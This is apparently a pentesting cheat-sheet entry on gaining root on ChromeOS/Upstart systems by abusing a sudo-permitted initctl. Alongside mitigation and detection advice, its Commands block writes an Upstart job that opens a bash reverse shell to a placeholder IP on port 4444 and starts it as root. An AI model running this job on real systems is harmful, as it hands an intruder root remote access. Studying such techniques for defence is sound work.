---
topic: initctl — privileged jobs on ChromeOS
tags: [linux, initctl, chromeos, sudo, privesc]
---

# initctl — privileged jobs on ChromeOS

**English** | [🌐 Español](initctl-privesc.md)

## Concept

On ChromeOS and Upstart-based systems, `initctl` controls system jobs. If a user can run it with sudo, they can start, stop or reload a job whose definition is writable, or launch a job running a controlled command. The result is root execution even without a SUID binary.

## When it applies

- `sudo -l` shows unrestricted `initctl`.
- A job has writable configuration or a controllable path.
- The system uses Upstart instead of systemd.

## Procedure

1. Review `sudo -l` and available jobs.
2. Find a job with a controllable command or configuration.
3. Modify the command or create a new job.
4. Start the job and verify execution as root.

## Commands

```bash
sudo -l
initctl list
ls -la /etc/init/
# Create or modify a job
printf 'exec /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' | sudo tee /etc/init/evil.conf
sudo initctl start evil
```

## Variants

- Use `initctl reload-configuration` after adding a file.
- Modify an existing job with weak permissions.
- Abuse a script called by a job.

## Limitations

- The sudo rule may restrict allowed jobs.
- The jobs directory may be read-only.
- ChromeOS may enforce integrity checks.

## Mitigation

- Restrict `initctl` in sudoers.
- Protect `/etc/init` and job scripts.
- Audit sudo rules and system jobs.

## Detection

- New jobs in `/etc/init`.
- `initctl start` from non-admin accounts.
- Upstart child processes with unusual commands.

## References

- [0xdf — Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html)
- [Chromium OS — Upstart](https://chromium.googlesource.com/chromiumos/third_party/upstart/)
- [CWE-269 — Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
